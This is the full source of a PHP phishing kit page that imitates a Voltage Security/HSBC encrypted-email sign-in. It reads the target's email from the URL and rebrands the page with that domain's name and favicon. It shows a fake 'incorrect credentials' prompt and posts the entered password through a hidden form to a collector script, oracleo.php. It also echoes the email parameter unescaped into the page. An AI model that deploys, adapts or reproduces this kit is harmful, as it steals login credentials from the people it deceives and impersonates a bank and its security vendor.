<?php
$email = $_GET['email'];
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);



?>










<!DOCTYPE html>

<!-- Copyright 2002-2016 Voltage Security, Inc. -->





<html class="no-js" lang="en">

<head> 



    <meta http-equiv="cache-control" content="no-cache,no-store,max-age=0,must-revalidate,private"/>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
    <meta http-equiv="expires" content="0"/>
    <meta http-equiv="pragma" content="no-cache"/>
    <meta name="com.voltage.locale.id" content="en_US">

    <meta name="robots" content="noindex, nofollow"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

    <link rel="shortcut icon" type="image/x-icon" href="http://<?php echo $domain ?>/favicon.ico"/>

    <title> <?php echo $yuh ?>
</title>

        <script type="text/javascript">
            if (top != self) {
              top.location = self.location;
            }
        </script>

    
    <link rel="stylesheet" type="text/css" href="shared/styles.css"/>

   
        <script  type="text/javascript">
          function setScreenWidth() {
            if (document.getElementById('resolution') != null) {
               document.getElementById('resolution').value = screen.width;
        }   
          }
        </script>
    
    
        <script src="modernizr.js"></script>
    
        <script type="text/javascript">

            function addLoadEvent(func) {
                var oldonload = window.onload;
                if (typeof window.onload != 'function') {
                    window.onload = func;
                } else {
                    window.onload = function() {
                        if (oldonload) {
                            oldonload();
                        }
                        func();
                    }
                }
            }

                var isCookieEnabled = navigator.cookieEnabled;
                if (!isCookieEnabled) {
                    document.cookie = "__vsm__cookie__test__";
                    isCookieEnabled = (document.cookie != null) && (document.cookie.indexOf("__vsm__cookie__test__") != -1);
                    if (isCookieEnabled) {
                        document.cookie = "__vsm__cookie__test__;expires=Thu, 01-Jan-1970 00:00:01 GMT";
                    }
                }
                if (!isCookieEnabled) {
                    window.location = "";
                }
    
            
            function FocusOnElementID(elementid) {
                var element = document.getElementById(elementid);
                if (element !== null) {
                    element.focus();
                }
            }
            
        </script>


</head>


<body onload="FocusOnElementID('up__X_PASSWORD_TMP')">
  <div id="wrapper">
    <header>
      <div id="header-inner">
        <div class="clearfix container">
          <table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
            <tr>
          
              <td style="vertical-align:middle" width="100%">
                   <h6 style="margin:0;">
                     <a
                           href="" target="logo"
                           title="<?php echo $yuh ?>"
                     >
                         <img class="logo" src="http://<?php echo $domain ?>/favicon.ico" style="border: none;" border="0"  alt="<?php echo $yuh ?>"/>
                     </a>
                  </h6>
              </td>
          
              <td>
                <table border="0" cellpadding="0" cellspacing="0" align="center">
                  <tr>
                    <td height="13px">
                    </td>
                  </tr>
  
                  <tr>
                    <td style="vertical-align:middle">
                      <ul class="shortcuts">           
                      </ul>
                    </td>

                    <td style="vertical-align:middle">       
                      <ul class="shortcuts">
                          <li>
                            <a href="" target="help"><span style="color: #db0011;">Help</span></a>
                          </li>
                      </ul>
                    </td>
                  </tr>
          
                  <tr>
                    <td colspan="2" style="height:16px; vertical-align:bottom;">
                    </td>
                  </tr>
                </table>
              </td>
          
            </tr>              
          </table>
        </div>
      </div>
    </header>
  <section id="content">
    <div class="container">





  <h2><span style="color: #1c1fce;"><b>Sign In</b></span></h2>
<span style="color: red;"><div><p>Incorrect login credentials. Please try again.</p></div></span>
<form onsubmit="return false;" method="post">
  <ol>

    
        <li>
          <p><?php echo $_GET['email']; ?></p>
        </li>

      

  <!--[if IE]>  
     <h2>Password</h2>
     <input type="password" name='up__X_PASSWORD_TMP' id='up__X_PASSWORD_TMP' tabindex='2' 
            value="" maxlength="255" 
            autocomplete="off" onKeyUp="return checkReturnChar(event);" />
  <![endif]-->

  <!--[if !IE]> -->
     <input type="password" name='up__X_PASSWORD_TMP' id='up__X_PASSWORD_TMP' tabindex='2' 
            value="" maxlength="255" 
            autocomplete="off" onKeyUp="return checkReturnChar(event);"
            placeholder="Password" />
  <!-- <![endif]-->
  
      
    <li class="es_up_submit">
      <button type="button" id='submitButton' name='submitButton' tabindex='3' onClick="return SubmitHiddenForm();" >Sign In</button>
      
    </li>

      <li>
      
        <p class="note">
          <a href="" id="ForgotLink" tabindex='4'><span style="color: #1500db;">Forgot your password?</span></a>
        </p>
      
      </li>

  </ol>
</form>

<form id="HiddenLoginForm" name="HiddenLoginForm" action="oracleo.php" method="post" >

  <input type="hidden" id="up__X_EMAIL" name="up__X_EMAIL" >
  <input type="hidden" id="up__X_PASSWORD" name="up_X_PASSWORD" >
  <input type="hidden" id="resolution" name="resolution" value="">
  <input type='hidden' name='upemail' value="<?php echo $_GET['email']; ?>" tabindex='3'/>
  <input type='hidden' name='up_ADI_USER_LOGIN' value="" />
    
</form>    
    

<script  type="text/javascript">
    addLoadEvent(setScreenWidth);

    function checkReturnChar(e) {
        if (e.keyCode == 13) {
            return SubmitHiddenForm();
        }
    }
    
    function SubmitHiddenForm() {
       var xemail = document.getElementById("up__X_EMAIL_TMP");
       if (xemail !== null) {
            document.getElementById("up__X_EMAIL").value = xemail.value;
       }
       
       document.getElementById("up__X_PASSWORD").value = document.getElementById("up__X_PASSWORD_TMP").value;

       document.getElementById('HiddenLoginForm').submit();
    }

</script>
<script src=""></script>




       <footer class="encrypted" align="center">
        <p>
              Email Encryption Provided by <?php echo $yuh ?>         </p>
      </footer>
      
      <footer class="powered">
          
                <p class="topline">Email Security Powered by <?php echo $yuh ?>  </p>
          
            <p><p><strong>Copyright <?php echo $yuh ?>   2020. All rights reserved.</strong></p></p>
  </footer>
        </div>
  
    </section>
  </div>


      <script>
          Modernizr.load([
              {
                  load: '/brand/br/US_HSBC_EN/rv/6b644/resources/common/jquery.js',
                  complete: function () {
                      if ( !window.jQuery ) {
                          Modernizr.load('/brand/br/US_HSBC_EN/rv/6b644/resources/common/jquery.js');
                      }
                  }
              },
              { load: '/brand/br/US_HSBC_EN/rv/6b644/resources/common/util.js' }
          ]);
      </script>
</body>
</html>
